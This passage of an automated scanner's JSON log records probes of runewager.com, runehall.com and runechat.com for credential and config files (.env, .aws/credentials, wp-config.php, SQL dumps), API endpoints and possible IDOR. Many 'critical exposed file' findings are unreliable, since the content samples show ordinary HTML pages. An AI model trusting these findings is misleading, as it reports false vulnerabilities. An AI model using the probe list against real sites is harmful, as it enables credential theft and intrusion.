        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:51",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/backup"
      },
      {
        "time": "22:03:51",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:51",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/sql"
      },
      {
        "time": "22:03:51",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:51",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/db.sql"
      },
      {
        "time": "22:03:51",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:54",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/dump.sql"
      },
      {
        "time": "22:03:54",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:56",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/backup.zip"
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:56",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/.aws/credentials"
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "Testing API endpoints on https://discord.runewager.com"
      },
      {
        "time": "22:03:57",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/api/v1/user (200)"
      },
      {
        "time": "22:03:58",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/api/v1/admin (200)"
      },
      {
        "time": "22:03:59",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/api/v1/config (200)"
      },
      {
        "time": "22:04:01",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/graphql (200)"
      },
      {
        "time": "22:04:02",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/rest/v1/users (200)"
      },
      {
        "time": "22:04:04",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/oauth/token (200)"
      },
      {
        "time": "22:04:04",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/v2/api-docs (200)"
      },
      {
        "time": "22:04:04",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/swagger-ui.html (200)"
      },
      {
        "time": "22:04:04",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:05",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/swagger.json (200)"
      },
      {
        "time": "22:04:05",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:05",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/actuator (200)"
      },
      {
        "time": "22:04:05",
        "level": "warning",
        "message": "API endpoint exposed: https://discord.runewager.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "http://runehall.com": {
    "findings": [
      {
        "time": "22:03:42",
        "level": "debug",
        "message": "Testing API endpoints on http://runehall.com"
      },
      {
        "time": "22:03:45",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:03:52",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:03:53",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:03:55",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/graphql (301)"
      },
      {
        "time": "22:03:57",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:04:01",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/oauth/token (301)"
      },
      {
        "time": "22:04:02",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:04:02",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:04:02",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:02",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/swagger.json (301)"
      },
      {
        "time": "22:04:02",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:02",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/actuator (301)"
      },
      {
        "time": "22:04:03",
        "level": "warning",
        "message": "API endpoint exposed: http://runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "https://runechat.com": {
    "findings": [
      {
        "time": "22:03:42",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runechat.com/admin"
      },
      {
        "time": "22:03:42",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html><html lang=\"en\"><head><meta name=\"google-site-verification\" content=\"4z-gdo_oFyS0UTC0ywCt3f9n7V-imASPwUEATk2tmao\"/><base href=\"/\"/><meta charSet=\"utf-8\"/><meta http-equiv=\"X-UA-Compatib..."
      },
      {
        "time": "22:03:49",
        "level": "debug",
        "message": "Testing API endpoints on https://runechat.com"
      }
    ]
  },
  "http://runehall.com/graphql": {
    "findings": [
      {
        "time": "22:03:55",
        "level": "debug",
        "message": "Testing GraphQL at http://runehall.com/graphql"
      }
    ]
  },
  "https://blog.runehall.com/wp-json/wp/v2/users": {
    "findings": [
      {
        "time": "22:03:56",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://blog.runehall.com/wp-json/wp/v2/users/1"
      }
    ]
  },
  "https://admin.runewager.com": {
    "findings": [
      {
        "time": "22:03:56",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/.env"
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:01",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/.git/config"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:01",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/.svn/entries"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:02",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/.htaccess"
      },
      {
        "time": "22:04:02",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:02",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/web.config"
      },
      {
        "time": "22:04:02",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:03",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/robots.txt"
      },
      {
        "time": "22:04:03",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:03",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/sitemap.xml"
      },
      {
        "time": "22:04:03",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:03",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/crossdomain.xml"
      },
      {
        "time": "22:04:03",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:03",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/phpinfo.php"
      },
      {
        "time": "22:04:03",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:05",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/wp-config.php"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:05",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/config.php"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:05",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/config.json"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:05",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/credentials.json"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:07",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/docker-compose.yml"
      },
      {
        "time": "22:04:07",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:07",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/traefik.yml"
      },
      {
        "time": "22:04:07",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:07",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/admin"
      },
      {
        "time": "22:04:07",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:08",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/backup"
      },
      {
        "time": "22:04:08",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:09",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/sql"
      },
      {
        "time": "22:04:09",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:10",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/db.sql"
      },
      {
        "time": "22:04:10",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:10",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/dump.sql"
      },
      {
        "time": "22:04:10",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:11",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/backup.zip"
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:11",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://admin.runewager.com/.aws/credentials"
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "Testing API endpoints on https://admin.runewager.com"
      },
      {
        "time": "22:04:11",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/api/v1/user (200)"
      },
      {
        "time": "22:04:12",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/api/v1/admin (200)"
      },
      {
        "time": "22:04:12",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/api/v1/config (200)"
      },
      {
        "time": "22:04:13",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/graphql (200)"
      },
      {
        "time": "22:04:13",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/rest/v1/users (200)"
      },
      {
        "time": "22:04:14",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/oauth/token (200)"
      },
      {
        "time": "22:04:15",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/v2/api-docs (200)"
      },
      {
        "time": "22:04:15",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/swagger-ui.html (200)"
      },
      {
        "time": "22:04:15",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:16",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/swagger.json (200)"
      },
      {
        "time": "22:04:16",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:16",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/actuator (200)"
      },
      {
        "time": "22:04:16",
        "level": "warning",
        "message": "API endpoint exposed: https://admin.runewager.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "https://discord.runewager.com/api/v1/user": {
    "findings": [
      {
        "time": "22:03:58",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://discord.runewager.com/api/v1/user/12345"
      }
    ]
  },
  "https://discord.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "Testing GraphQL at https://discord.runewager.com/graphql"
      }
    ]
  },
  "https://discord.runewager.com/rest/v1/users": {
    "findings": [
      {
        "time": "22:04:03",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://discord.runewager.com/rest/v1/users/12345"
      }
    ]
  },
  "https://discord.runewager.com/wp-json/wp/v2/users": {
    "findings": [
      {
        "time": "22:04:06",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://discord.runewager.com/wp-json/wp/v2/users/12345"
      }
    ]
  },
  "https://www.discord.runewager.com/api/v1/user": {
    "findings": [
      {
        "time": "22:04:06",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://www.discord.runewager.com/api/v1/user/12345"
      }
    ]
  },
  "https://www.discord.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:04:08",
        "level": "debug",
        "message": "Testing GraphQL at https://www.discord.runewager.com/graphql"
      }
    ]
  },
  "https://www.discord.runewager.com/rest/v1/users": {
    "findings": [
      {
        "time": "22:04:08",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://www.discord.runewager.com/rest/v1/users/12345"
      }
    ]
  },
  "https://runewager.com": {
    "findings": [
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "Testing API endpoints on https://runewager.com"
      },
      {
        "time": "22:04:11",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/api/v1/user (301)"
      },
      {
        "time": "22:04:12",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/api/v1/admin (301)"
      },
      {
        "time": "22:04:13",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/api/v1/config (301)"
      },
      {
        "time": "22:04:13",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/graphql (301)"
      },
      {
        "time": "22:04:13",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/rest/v1/users (301)"
      },
      {
        "time": "22:04:15",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/oauth/token (301)"
      },
      {
        "time": "22:04:15",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/v2/api-docs (301)"
      },
      {
        "time": "22:04:16",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/swagger-ui.html (301)"
      },
      {
        "time": "22:04:16",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:17",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/swagger.json (301)"
      },
      {
        "time": "22:04:17",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:17",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/actuator (301)"
      },
      {
        "time": "22:04:17",
        "level": "warning",
        "message": "API endpoint exposed: https://runewager.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "https://www.discord.runewager.com/wp-json/wp/v2/users": {
    "findings": [
      {
        "time": "22:04:11",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://www.discord.runewager.com/wp-json/wp/v2/users/12345"
      }
    ]
  },
  "https://admin.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:04:13",
        "level": "debug",
        "message": "Testing GraphQL at https://admin.runewager.com/graphql"
      }
    ]
  },
  "https://runewager.com/graphql": {
    "findings": [
      {
        "time": "22:04:13",
        "level": "debug",
        "message": "Testing GraphQL at https://runewager.com/graphql"
      }
    ]
  },
  "https://runehall.com": {
    "findings": [
      {
        "time": "22:04:17",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/robots.txt"
      },
      {
        "time": "22:04:17",
        "level": "debug",
        "message": "File content sample: # * User-agent: * Allow: /  # Host Host: https://runehall.com  # Sitemaps Sitemap: https://runehall.com/sitemap.xml ..."
      },
      {
        "time": "22:04:17",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/sitemap.xml"
      },
      {
        "time": "22:04:17",
        "level": "debug",
        "message": "File content sample: <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">   <url>     <loc>https://runehall.com</loc>     <lastmod>2023-03-10T00:00:00+00:00<..."
      },
      {
        "time": "22:04:17",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/crossdomain.xml"
      },
      {
        "time": "22:04:17",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:19",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/config.json"
      },
      {
        "time": "22:04:19",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:20",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/credentials.json"
      },
      {
        "time": "22:04:20",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:20",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/docker-compose.yml"
      },
      {
        "time": "22:04:20",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:20",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/traefik.yml"
      },
      {
        "time": "22:04:20",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:21",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/admin"
      },
      {
        "time": "22:04:21",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:21",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/backup"
      },
      {
        "time": "22:04:21",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:21",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/sql"
      },
      {
        "time": "22:04:21",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:22",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/db.sql"
      },
      {
        "time": "22:04:22",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:22",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/dump.sql"
      },
      {
        "time": "22:04:22",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:22",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://runehall.com/backup.zip"
      },
      {
        "time": "22:04:22",
        "level": "debug",
        "message": "File content sample: <!DOCTYPE html> <html lang=\"en\">   <head>     <link       href=\"https://unpkg.com/nprogress@0.2.0/nprogress.css\"       rel=\"stylesheet\"     />     <script src=\"https://unpkg.com/nprogress@0.2.0/nprogr..."
      },
      {
        "time": "22:04:23",
        "level": "debug",
        "message": "Testing API endpoints on https://runehall.com"
      },
      {
        "time": "22:04:23",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/api/v1/user (200)"
      },
      {
        "time": "22:04:24",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/api/v1/admin (200)"
      },
      {
        "time": "22:04:24",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/api/v1/config (200)"
      },
      {
        "time": "22:04:24",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/graphql (200)"
      },
      {
        "time": "22:04:25",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/rest/v1/users (200)"
      },
      {
        "time": "22:04:26",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/oauth/token (200)"
      },
      {
        "time": "22:04:27",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/v2/api-docs (200)"
      },
      {
        "time": "22:04:27",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/swagger-ui.html (200)"
      },
      {
        "time": "22:04:27",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:28",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/swagger.json (200)"
      },
      {
        "time": "22:04:28",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:28",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/actuator (200)"
      },
      {
        "time": "22:04:29",
        "level": "warning",
        "message": "API endpoint exposed: https://runehall.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "https://runehall.com/api/v1/user": {
    "findings": [
      {
        "time": "22:04:23",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://runehall.com/api/v1/user/12345"
      }
    ]
  },
  "https://runehall.com/graphql": {
    "findings": [
      {
        "time": "22:04:24",
        "level": "debug",
        "message": "Testing GraphQL at https://runehall.com/graphql"
      }
    ]
  },
  "https://runehall.com/rest/v1/users": {
    "findings": [
      {
        "time": "22:04:26",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://runehall.com/rest/v1/users/12345"
      }
    ]
  },
